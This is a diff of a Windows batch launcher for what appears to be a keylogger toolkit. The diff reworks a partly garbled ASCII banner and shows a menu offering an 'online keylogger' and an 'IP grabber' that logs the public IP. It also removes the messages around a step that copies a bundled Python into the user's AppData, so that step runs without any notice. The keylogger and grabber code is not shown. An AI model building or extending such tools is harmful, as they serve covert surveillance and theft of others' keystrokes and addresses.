@@ -2,18 +2,18 @@
 
 :start
 cls
-echo "  __    __                      __                                                   "
-echo " /  |  /  |                    /  |                                                  "
-echo " $$ | /$$/   ______   __    __ $$ |  ______    ______    ______    ______    ______  "
+echo "                                                                                     "
+echo " /  |  /  |                                                                          "
+echo " $$ | /$$/   __         __    __    __    __    __                                   "
 echo " $$ |/$$/   /      \ /  |  /  |$$ | /      \  /      \  /      \  /      \  /      \ "
 echo " $$  $$<   /$$$$$$  |$$ |  $$ |$$ |/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |"
 echo " $$$$$  \  $$    $$ |$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ "
-echo " $$ |$$  \ $$$$$$$$/ $$ \__$$ |$$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |$$$$$$$$/ $$ |      "
+echo " $$ |$$  \ $$$$$$$$/ $$   _$$ |$$ |$$   _$$ |$$   _$$ |$$   _$$ |$$$$$$$$/ $$ |      "
 echo " $$ | $$  |$$       |$$    $$ |$$ |$$    $$/ $$    $$ |$$    $$ |$$       |$$ |      "
 echo " $$/   $$/  $$$$$$$/  $$$$$$$ |$$/  $$$$$$/   $$$$$$$ | $$$$$$$ | $$$$$$$/ $$/       "
-echo "                     /  \__$$ |              /  \__$$ |/  \__$$ |                    "
+echo "                       /  _$$ |                /  _$$ |/     __$$ |                  "
 echo "                     $$    $$/               $$    $$/ $$    $$/                     "
-echo "                      $$$$$$/                 $$$$$$/   $$$$$$/                      "
+echo "                      $$$$$$/                 $$$$$$/   $$$$$$/                      "                                
 
 echo Menu:
 echo 1. open online keylogger (requires setting up): 1
@@ -22,9 +22,7 @@ echo 3. open offline IPGrabber (logs in public_ip.txt locally) 3
 echo 4. exit
 
 ::install Python
-echo Installing Python...
-xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311>nul
-echo Finished
+xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311
 
 set PYTHON= %APPDATA%\..\Local\Programs\Python\Python311\python.exe
 
@@ -52,4 +50,3 @@ if %option%==4 (
 
 ::INVALID OPTION
 goto start
-
